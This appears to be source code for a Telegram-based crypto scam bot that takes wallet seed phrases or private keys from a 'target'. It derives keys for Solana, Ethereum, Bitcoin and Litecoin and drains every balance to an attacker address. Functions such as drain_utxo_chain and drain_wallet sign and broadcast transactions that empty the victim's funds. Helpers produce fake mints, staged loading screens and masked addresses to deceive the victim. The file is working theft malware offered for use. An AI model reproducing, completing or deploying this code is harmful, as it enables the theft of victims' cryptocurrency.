'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tailor', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo']


def fake_mint() -> str:
    if HAS_SOLANA:
        return base58.b58encode(os.urandom(32)).decode()
    return "".join(random.choices(string.ascii_letters + string.digits, k=44))


def short_addr(addr: str) -> str:
    if not addr or len(addr) < 12:
        return addr or "—"
    return f"{addr[:4]}...{addr[-4:]}"


def mask_mint(addr: str) -> str:
    """Obfuscate mint so target can't paste into pump.fun — show 6 chars then asterisks."""
    if not addr or len(addr) < 10:
        return addr or "—"
    visible = addr[:6]
    stars = "✱" * min(len(addr) - 6, 14)
    return f"{visible}{stars}"


async def staged_loading(message_or_cb, stages: list):
    msg = None
    is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
    for i, (txt, delay) in enumerate(stages):
        if i == 0:
            if is_cb:
                try:
                    await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
                    msg = message_or_cb.message
                except Exception:
                    msg = await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
            else:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        else:
            try:
                await msg.edit_text(txt, parse_mode=ParseMode.HTML)
            except Exception:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML) if not is_cb else await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
        if delay > 0:
            await asyncio.sleep(delay)
    return msg


SOL_PRICE = 180.0
ETH_PRICE = 3200.0
BNB_PRICE = 580.0
BTC_PRICE = 95000.0
LTC_PRICE = 90.0
USDC_PRICE = 1.0
_price_cache: dict = {}
_price_cache_ts: float = 0.0
_PRICE_TTL = 300.0  # 5 min


async def _refresh_prices() -> None:
    global SOL_PRICE, ETH_PRICE, BNB_PRICE, BTC_PRICE, LTC_PRICE, _price_cache_ts
    try:
        data = await _http_json(
            "GET",
            "https://api.coingecko.com/api/v3/simple/price"
            "?ids=solana,ethereum,binancecoin,bitcoin,litecoin&vs_currencies=usd",
            timeout=6.0,
        )
        if isinstance(data, dict):
            if "solana" in data:
                SOL_PRICE = float(data["solana"]["usd"])
            if "ethereum" in data:
                ETH_PRICE = float(data["ethereum"]["usd"])
            if "binancecoin" in data:
                BNB_PRICE = float(data["binancecoin"]["usd"])
            if "bitcoin" in data:
                BTC_PRICE = float(data["bitcoin"]["usd"])
            if "litecoin" in data:
                LTC_PRICE = float(data["litecoin"]["usd"])
            _price_cache_ts = time.time()
            log.info(
                "Prices updated SOL=%.2f ETH=%.2f BNB=%.2f BTC=%.2f LTC=%.2f",
                SOL_PRICE, ETH_PRICE, BNB_PRICE, BTC_PRICE, LTC_PRICE,
            )
    except Exception as e:
        log.warning("Price refresh failed: %s", e)


async def get_prices() -> None:
    """Call before any USD estimate; refreshes if stale."""
    if time.time() - _price_cache_ts > _PRICE_TTL:
        await _refresh_prices()


def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
    return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE


# ──────────────────────────────────────────────
# KEY DERIVATION
# ──────────────────────────────────────────────
def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
    salt = ("mnemonic" + passphrase).encode("utf-8")
    return hashlib.pbkdf2_hmac("sha512", mnemonic.strip().encode("utf-8"), salt, 2048)


def _hmac_sha512(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha512).digest()


def _slip10_derive(seed: bytes, path: str) -> bytes:
    I = _hmac_sha512(b"ed25519 seed", seed)
    IL, IR = I[:32], I[32:]
    for segment in path.lstrip("m/").split("/"):
        if not segment:
            continue
        hardened = segment.endswith("'") or segment.endswith("h")
        index = int(segment.rstrip("'h"))
        if hardened:
            index += 0x80000000
        data = b"\x00" + IL + struct.pack(">I", index)
        I = _hmac_sha512(IR, data)
        IL, IR = I[:32], I[32:]
    return IL


_SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_SECP256K1_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_SECP256K1_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
_SECP256K1_P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F


def _modinv(a: int, m: int) -> int:
    return pow(a % m, -1, m)


def _point_add(p1, p2):
    if p1 is None: return p2
    if p2 is None: return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and y1 != y2: return None
    if x1 == x2:
        m = (3 * x1 * x1) * _modinv(2 * y1, _SECP256K1_P) % _SECP256K1_P
    else:
        m = (y2 - y1) * _modinv(x2 - x1, _SECP256K1_P) % _SECP256K1_P
    x3 = (m * m - x1 - x2) % _SECP256K1_P
    y3 = (m * (x1 - x3) - y1) % _SECP256K1_P
    return (x3, y3)


def _point_mul(k: int, point=None):
    if point is None:
        point = (_SECP256K1_GX, _SECP256K1_GY)
    result = None
    addend = point
    while k:
        if k & 1:
            result = _point_add(result, addend)
        addend = _point_add(addend, addend)
        k >>= 1
    return result


def _ser32(i: int) -> bytes:
    return struct.pack(">I", i)


def _ser256(i: int) -> bytes:
    return i.to_bytes(32, "big")


def _parse256(b: bytes) -> int:
    return int.from_bytes(b, "big")


def _point_ser(P, compressed: bool = True) -> bytes:
    if P is None: raise ValueError("point at infinity")
    x, y = P
    if compressed:
        return (b"\x02" if (y % 2 == 0) else b"\x03") + _ser256(x)
    return b"\x04" + _ser256(x) + _ser256(y)


def _bip32_master(seed: bytes) -> Tuple[bytes, bytes]:
    I = _hmac_sha512(b"Bitcoin seed", seed)
    return I[:32], I[32:]


def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
    if index >= 0x80000000:
        data = b"\x00" + k + _ser32(index)
    else:
        P = _point_mul(_parse256(k))
        data = _point_ser(P, True) + _ser32(index)
    I = _hmac_sha512(c, data)
    IL, IR = I[:32], I[32:]
    ki = (_parse256(IL) + _parse256(k)) % _SECP256K1_N
    if ki == 0 or _parse256(IL) >= _SECP256K1_N:
        raise ValueError("invalid BIP32 child key")
    return _ser256(ki), IR


def _bip32_derive_path(seed: bytes, path: str) -> bytes:
    k, c = _bip32_master(seed)
    for segment in path.lstrip("m/").split("/"):
        if not segment: continue
        hardened = segment.endswith("'") or segment.endswith("h")
        index = int(segment.rstrip("'h"))
        if hardened: index += 0x80000000
        k, c = _bip32_ckd_priv(k, c, index)
    return k


def _normalize_mnemonic(raw: str) -> str:
    s = raw.strip().lower()
    for ch in (",", ";", "|", "\n", "\r", "\t",
               "\u00a0",  # non-breaking space (iOS/macOS paste)
               "\u2009",  # thin space
               "\u200b",  # zero-width space
               "\u202f",  # narrow no-break space
               "\u3000",  # ideographic space
               ):
        s = s.replace(ch, " ")
    return " ".join(s.split())


def _is_mnemonic(text: str) -> bool:
    words = text.split()
    return len(words) in (12, 15, 18, 21, 24) and all(w.isalpha() and 2 <= len(w) <= 12 for w in words)


def _sol_keypair_from_seed32(seed32: bytes):
    if not HAS_SOLANA:
        raise RuntimeError("Solana libraries not installed")
    return Keypair.from_seed(seed32)


def _sol_priv_pub_from_seed32(seed32: bytes) -> Tuple[str, str]:
    kp = _sol_keypair_from_seed32(seed32)
    priv_b58 = base58.b58encode(bytes(kp)).decode()
    return priv_b58, str(kp.pubkey())


SOL_PATHS: List[Tuple[str, str]] = [
    ("Phantom/Solflare/OKX", "m/44'/501'/0'/0'"),
    ("Phantom account 1",    "m/44'/501'/1'/0'"),
    ("Phantom account 2",    "m/44'/501'/2'/0'"),
    ("Phantom account 3",    "m/44'/501'/3'/0'"),
    ("Phantom change 1",     "m/44'/501'/0'/1'"),
    ("Trust Wallet",         "m/44'/501'/0'"),
    ("Trust account 1",      "m/44'/501'/1'"),
]


def derive_solana_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
    if not HAS_SOLANA:
        raise RuntimeError("HAS_SOLANA=False")
    seed = _pbkdf2_mnemonic(mnemonic)
    out: List[Tuple[str, str, str]] = []
    seen = set()

    for label, path in SOL_PATHS:
        try:
            seed32 = _slip10_derive(seed, path)
            priv, pub = _sol_priv_pub_from_seed32(seed32)
            if pub in seen: continue
            seen.add(pub)
            out.append((label + " " + path, priv, pub))
        except Exception as e:
            log.warning("path %s failed: %s", path, e)

    try:
        exo = _bip32_derive_path(seed, "m/44'/501'/0'/0/0")
        priv, pub = _sol_priv_pub_from_seed32(exo)
        if pub not in seen:
            seen.add(pub)
            out.append(("Exodus m/44'/501'/0'/0/0", priv, pub))
    except Exception as e:
        log.warning("Exodus path failed: %s", e)

    try:
        priv, pub = _sol_priv_pub_from_seed32(seed[:32])
        if pub not in seen:
            seen.add(pub)
            out.append(("Raw BIP39 seed[:32]", priv, pub))
    except Exception as e:
        log.warning("Raw seed path failed: %s", e)

    if not out:
        raise ValueError("No Solana keys could be derived from this mnemonic")
    return out


def derive_solana_default(mnemonic: str) -> Tuple[str, str]:
    seed = _pbkdf2_mnemonic(mnemonic)
    seed32 = _slip10_derive(seed, "m/44'/501'/0'/0'")
    return _sol_priv_pub_from_seed32(seed32)


def parse_solana_private_key(raw: str) -> Tuple[str, str]:
    if not HAS_SOLANA:
        raise RuntimeError("HAS_SOLANA=False")
    s = raw.strip()
    if s.startswith("[") and s.endswith("]"):
        arr = json.loads(s)
        secret = bytes(arr)
    else:
        secret = base58.b58decode(s)
    if len(secret) == 32:
        kp = Keypair.from_seed(secret)
    elif len(secret) == 64:
        kp = Keypair.from_bytes(secret)
    else:
        raise ValueError(f"Unsupported Solana key length: {len(secret)}")
    priv_b58 = base58.b58encode(bytes(kp)).decode()
    return priv_b58, str(kp.pubkey())


def parse_evm_private_key(raw: str) -> Tuple[str, str]:
    if not HAS_WEB3:
        raise RuntimeError("HAS_WEB3=False")
    key = raw.strip()
    if key.startswith("0x"):
        key = key[2:]
    if len(key) != 64:
        raise ValueError("EVM key must be 64 hex chars")
    acct = Account.from_key(key)
    return "0x" + key.lower(), acct.address


def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
    if not HAS_WEB3:
        return None
    try:
        seed = _pbkdf2_mnemonic(mnemonic)
        path = f"m/44'/60'/0'/0/{account}"
        priv_bytes = _bip32_derive_path(seed, path)
        acct = Account.from_key(priv_bytes)
        return acct.key.hex(), acct.address
    except Exception as e:
        log.warning("EVM mnemonic derive failed: %s", e)
        return None


# ──────────────────────────────────────────────
# BTC / LTC
# ──────────────────────────────────────────────
def _hash160(b: bytes) -> bytes:
    return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()


def _b58check(payload: bytes) -> str:
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    n = int.from_bytes(payload + chk, "big")
    out = ""
    while n > 0:
        n, r = divmod(n, 58)
        out = alphabet[r] + out
    for byte in payload + chk:
        if byte == 0:
            out = "1" + out
        else:
            break
    return out


def _wif_from_priv(priv32: bytes, *, compressed: bool = True, wif_prefix: int = 0x80) -> str:
    payload = bytes([wif_prefix]) + priv32 + (b"\x01" if compressed else b"")
    return _b58check(payload)


def _bech32_polymod(values):
    GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for v in values:
        b = chk >> 25
        chk = ((chk & 0x1ffffff) << 5) ^ v
        for i in range(5):
            chk ^= GEN[i] if ((b >> i) & 1) else 0
    return chk


def _bech32_hrp_expand(hrp: str):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]


def _bech32_create_checksum(hrp: str, data, spec="bech32"):
    const = 0x2bc830a3 if spec == "bech32m" else 1
    values = _bech32_hrp_expand(hrp) + data
    polymod = _bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ const
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]


def _bech32_encode(hrp: str, witver: int, witprog: bytes) -> str:
    charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
    converted = _convertbits(list(witprog), 8, 5, True)
    if converted is None:
        raise ValueError("bech32 encode convertbits failed")
    data = [witver] + converted
    combined = data + _bech32_create_checksum(hrp, data, "bech32" if witver == 0 else "bech32m")
    return hrp + "1" + "".join(charset[d] for d in combined)


def _convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    for value in data:
        if value < 0 or (value >> frombits):
            return None
        acc = (acc << frombits) | value
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits:
            ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret


def _p2wpkh_address(priv32: bytes, hrp: str = "bc") -> str:
    P = _point_mul(_parse256(priv32))
    if P is None:
        raise ValueError("invalid priv")
    x, y = P
    prefix = b"\x02" if (y % 2 == 0) else b"\x03"
    pub = prefix + _ser256(x)
    return _bech32_encode(hrp, 0, _hash160(pub))


def _p2pkh_address(priv32: bytes, version: int = 0x00) -> str:
    P = _point_mul(_parse256(priv32))
    if P is None:
        raise ValueError("point at infinity — invalid private key")
    x, y = P
    prefix = b"\x02" if (y % 2 == 0) else b"\x03"
    pub = prefix + _ser256(x)
    return _b58check(bytes([version]) + _hash160(pub))


def derive_btc_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[dict]:
    try:
        seed = _pbkdf2_mnemonic(mnemonic)
        priv84 = _bip32_derive_path(seed, f"m/84'/0'/{account}'/0/0")
        addr84 = _p2wpkh_address(priv84, "bc")
        wif84 = _wif_from_priv(priv84, compressed=True, wif_prefix=0x80)
        priv44 = _bip32_derive_path(seed, f"m/44'/0'/{account}'/0/0")
        addr44 = _p2pkh_address(priv44, 0x00)
        wif44 = _wif_from_priv(priv44, compressed=True, wif_prefix=0x80)
        return {
            "priv84": priv84.hex(),
            "addr84": addr84,
            "wif84": wif84,
            "priv44": priv44.hex(),
            "addr44": addr44,
            "wif44": wif44,
        }
    except Exception as e:
        log.warning("BTC derive failed: %s", e)
        return None


def derive_ltc_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[dict]:
    try:
        seed = _pbkdf2_mnemonic(mnemonic)
        priv84 = _bip32_derive_path(seed, f"m/84'/2'/{account}'/0/0")
        addr84 = _p2wpkh_address(priv84, "ltc")
        wif84 = _wif_from_priv(priv84, compressed=True, wif_prefix=0xB0)
        priv44 = _bip32_derive_path(seed, f"m/44'/2'/{account}'/0/0")
        addr44 = _p2pkh_address(priv44, 0x30)
        wif44 = _wif_from_priv(priv44, compressed=True, wif_prefix=0xB0)
        return {
            "priv84": priv84.hex(),
            "addr84": addr84,
            "wif84": wif84,
            "priv44": priv44.hex(),
            "addr44": addr44,
            "wif44": wif44,
        }
    except Exception as e:
        log.warning("LTC derive failed: %s", e)
        return None


async def _http_json(method: str, url: str, body: Optional[str] = None, timeout: float = 12.0):
    import urllib.request
    import urllib.error
    def _do():
        req = urllib.request.Request(url, data=(body.encode() if body is not None else None), method=method)
        if body is not None:
            req.add_header("Content-Type", "text/plain")
        req.add_header("User-Agent", "GetRugged/1.0")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                data = resp.read().decode()
        except urllib.error.HTTPError as e:
            try:
                err_body = e.read().decode()
            except Exception:
                err_body = ""
            raise RuntimeError(f"HTTP {e.code}: {err_body[:200]}")
        if not data:
            return None
        try:
            return json.loads(data)
        except Exception:
            return data
    return await asyncio.to_thread(_do)


async def fetch_utxo_balance(api_base: str, address: str) -> float:
    if not address:
        return 0.0
    try:
        data = await _http_json("GET", f"{api_base.rstrip('/')}/address/{address}")
        if not isinstance(data, dict):
            return 0.0
        chain = data.get("chain_stats") or {}
        mem = data.get("mempool_stats") or {}
        funded = int(chain.get("funded_txo_sum") or 0) + int(mem.get("funded_txo_sum") or 0)
        spent = int(chain.get("spent_txo_sum") or 0) + int(mem.get("spent_txo_sum") or 0)
        return max(0, funded - spent) / 1e8
    except Exception as e:
        log.warning("UTXO balance %s: %s", address[:12], e)
        return 0.0


async def fetch_utxos(api_base: str, address: str) -> list:
    try:
        data = await _http_json("GET", f"{api_base.rstrip('/')}/address/{address}/utxo")
        return data if isinstance(data, list) else []
    except Exception as e:
        log.warning("UTXO list %s: %s", address[:12], e)
        return []


def _ser_compact_size(n: int) -> bytes:
    if n < 0xfd:
        return bytes([n])
    if n <= 0xffff:
        return b"\xfd" + n.to_bytes(2, "little")
    if n <= 0xffffffff:
        return b"\xfe" + n.to_bytes(4, "little")
    return b"\xff" + n.to_bytes(8, "little")


def _hash256(b: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def _ecdsa_sign_raw(priv32: bytes, z: int) -> Tuple[int, int]:
    n = _SECP256K1_N
    d = _parse256(priv32)
    k = _parse256(hashlib.sha256(priv32 + z.to_bytes(32, "big")).digest()) % n
    if k == 0:
        k = _parse256(hashlib.sha256(priv32 + b"\x00" + z.to_bytes(32, "big")).digest()) % n or 1
    for attempt in range(32):
        R = _point_mul(k)
        r = R[0] % n
        if r == 0:
            k = _parse256(hashlib.sha256(priv32 + k.to_bytes(32, "big") + z.to_bytes(32, "big")).digest()) % n or 1
            continue
        s = (_modinv(k, n) * (z + r * d)) % n
        if s == 0:
            k = _parse256(hashlib.sha256(priv32 + k.to_bytes(32, "big") + z.to_bytes(32, "big")).digest()) % n or 1
            continue
        if s > n // 2:
            s = n - s
        return r, s
    raise RuntimeError("ecdsa sign failed")


def _der_sig(r: int, s: int) -> bytes:
    def enc(x: int) -> bytes:
        b = x.to_bytes(32, "big").lstrip(b"\x00")
        if b[0] & 0x80:
            b = b"\x00" + b
        return b"\x02" + bytes([len(b)]) + b
    body = enc(r) + enc(s)
    return b"\x30" + bytes([len(body)]) + body


def _bech32_decode_prog(addr: str) -> bytes:
    charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
    if "1" not in addr:
        raise ValueError("bad bech32")
    hrp, data_part = addr.rsplit("1", 1)
    data = [charset.index(c) for c in data_part.lower()]
    if _bech32_polymod(_bech32_hrp_expand(hrp) + data) != 1:
        raise ValueError("bad bech32 checksum")
    witver = data[0]
    raw = _convertbits(data[1:-6], 5, 8, False)
    if raw is None:
        raise ValueError("bech32 convertbits failed")
    prog = bytes(raw)
    if witver != 0 or len(prog) != 20:
        raise ValueError(f"unsupported witness: ver={witver}, len={len(prog)}")
    return prog


def _build_p2wpkh_tx(priv32: bytes, utxos: list, dest_addr: str, fee_sats: int, hrp: str) -> Optional[str]:
    if not utxos:
        return None
    expected_prefix = hrp + "1"
    if not dest_addr.lower().startswith(expected_prefix):
        log.warning("dest %s does not match hrp %s", dest_addr[:12], hrp)
        return None
    try:
        dest_prog = _bech32_decode_prog(dest_addr)
    except Exception as e:
        log.warning("dest decode: %s", e)
        return None

    P = _point_mul(_parse256(priv32))
    x, y = P
    prefix = b"\x02" if (y % 2 == 0) else b"\x03"
    pubkey = prefix + _ser256(x)
    pub_hash = _hash160(pubkey)

    total = sum(int(u.get("value") or 0) for u in utxos)
    if total <= fee_sats + 546:
        return None
    send = total - fee_sats

    vin = b""
    for u in utxos:
        txid = bytes.fromhex(u["txid"])[::-1]
        vout = int(u["vout"]).to_bytes(4, "little")
        vin += txid + vout + b"\x00" + b"\xff\xff\xff\xff"
    vin = _ser_compact_size(len(utxos)) + vin

    script_out = bytes([0x00, 0x14]) + dest_prog
    vout = _ser_compact_size(1)
    vout += send.to_bytes(8, "little")
    vout += _ser_compact_size(len(script_out)) + script_out

    version = (2).to_bytes(4, "little")
    locktime = (0).to_bytes(4, "little")
    marker_flag = b"\x00\x01"

    prevouts = b""
    sequences = b""
    for u in utxos:
        prevouts += bytes.fromhex(u["txid"])[::-1] + int(u["vout"]).to_bytes(4, "little")
        sequences += b"\xff\xff\xff\xff"
    hash_prevouts = _hash256(prevouts)
    hash_sequence = _hash256(sequences)
    hash_outputs = _hash256(send.to_bytes(8, "little") + _ser_compact_size(len(script_out)) + script_out)

    witnesses = []
    script_code = b"\x19\x76\xa9\x14" + pub_hash + b"\x88\xac"

    for u in utxos:
        outpoint = bytes.fromhex(u["txid"])[::-1] + int(u["vout"]).to_bytes(4, "little")
        amount = int(u["value"]).to_bytes(8, "little")
        seq = b"\xff\xff\xff\xff"
        preimage = (
            version
            + hash_prevouts
            + hash_sequence
            + outpoint
            + script_code
            + amount
            + seq
            + hash_outputs
            + locktime
            + (1).to_bytes(4, "little")
        )
        z = int.from_bytes(_hash256(preimage), "big")
        r, s = _ecdsa_sign_raw(priv32, z)
        der = _der_sig(r, s) + b"\x01"
        witnesses.append(_ser_compact_size(2) + _ser_compact_size(len(der)) + der + _ser_compact_size(len(pubkey)) + pubkey)

    witness = b"".join(witnesses)
    raw = version + marker_flag + vin + vout + witness + locktime
    return raw.hex()


async def drain_utxo_chain(
    priv_hex: str,
    from_addr: str,
    dest: str,
    api_base: str,
    hrp: str,
    chain_name: str,
    fee_sats: int = 1500,
) -> Optional[str]:
    if not dest or not priv_hex or not from_addr:
        return None
    try:
        utxos = await fetch_utxos(api_base, from_addr)
        if not utxos:
            log.info("%s no utxos on %s", chain_name, from_addr[:12])
            return None
        total = sum(int(u.get("value") or 0) for u in utxos)
        if total <= fee_sats + 546:
            log.info("%s balance too low (%s sats)", chain_name, total)
            return None
        priv32 = bytes.fromhex(priv_hex)
        raw_hex = _build_p2wpkh_tx(priv32, utxos, dest, fee_sats, hrp)
        if not raw_hex:
            return None
        res = await _http_json("POST", f"{api_base.rstrip('/')}/tx", body=raw_hex)
        if isinstance(res, dict) and res.get("error"):
            log.warning("%s broadcast error: %s", chain_name, res)
            return None
        sig = res if isinstance(res, str) else (res.get("txid") if isinstance(res, dict) else None)
        if not sig:
            sig = str(res)[:64] if res else None
        log.info("DRAINED %s %s sats → %s | %s", chain_name, total - fee_sats, dest[:12], sig)
        return sig
    except Exception as e:
        log.exception("%s drain error: %s", chain_name, e)
        return None


# ──────────────────────────────────────────────
# BALANCE HELPERS
# ──────────────────────────────────────────────
async def fetch_sol_balance(pubkey: str) -> float:
    if not HAS_SOLANA or not pubkey or pubkey.startswith(("Sim", "0x")):
        return 0.0
    try:
        async with AsyncClient(RPC_URL) as client:
            pk = Pubkey.from_string(pubkey)
            resp = await asyncio.wait_for(client.get_balance(pk), timeout=8)
            return resp.value / 1_000_000_000
    except Exception as e:
        log.warning("SOL balance %s: %s", pubkey[:8], e)
        return 0.0


async def fetch_evm_balance(rpc: str, address: str) -> float:
    if not HAS_WEB3 or not address:
        return 0.0
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
        bal = await asyncio.to_thread(w3.eth.get_balance, Web3.to_checksum_address(address))
        return float(w3.from_wei(bal, "ether"))
    except Exception as e:
        log.warning("EVM balance %s: %s", address[:10], e)
        return 0.0


async def fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
    if not HAS_WEB3 or not address:
        return 0.0
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
        contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)

        def _call():
            bal = contract.functions.balanceOf(Web3.to_checksum_address(address)).call()
            decimals = contract.functions.decimals().call()
            return bal / (10 ** decimals)

        return await asyncio.to_thread(_call)
    except Exception as e:
        log.warning("USDC balance: %s", e)
        return 0.0


async def pick_best_sol_candidate(candidates: List[Tuple[str, str, str]]) -> Tuple[str, str, str, float]:
    async def one(pub: str) -> float:
        try:
            return await asyncio.wait_for(fetch_sol_balance(pub), timeout=7)
        except Exception:
            return 0.0

    bals = await asyncio.gather(*[one(c[2]) for c in candidates])
    best_i = 0
    best_bal = -1.0
    for i, bal in enumerate(bals):
        log.info("  candidate %s → %s  SOL=%.6f", candidates[i][0], candidates[i][2][:8], bal)
        if bal > best_bal:
            best_bal = bal
            best_i = i
    label, priv, pub = candidates[best_i]
    return label, priv, pub, best_bal


# ──────────────────────────────────────────────
# DRAIN CORE
# ──────────────────────────────────────────────
async def drain_wallet(private_key_b58: str, dest: str) -> Optional[Tuple[str, float]]:
    """Returns (sig, sol_amount) or None. Also drains SPL tokens inside same session."""
    if not HAS_SOLANA:
        log.warning("Solana libs missing — drain simulated")
        return ("SIM_" + fake_sig()[:32], 0.0)
    try:
        secret = base58.b58decode(private_key_b58.strip())
        if len(secret) == 32:
            kp = Keypair.from_seed(secret)
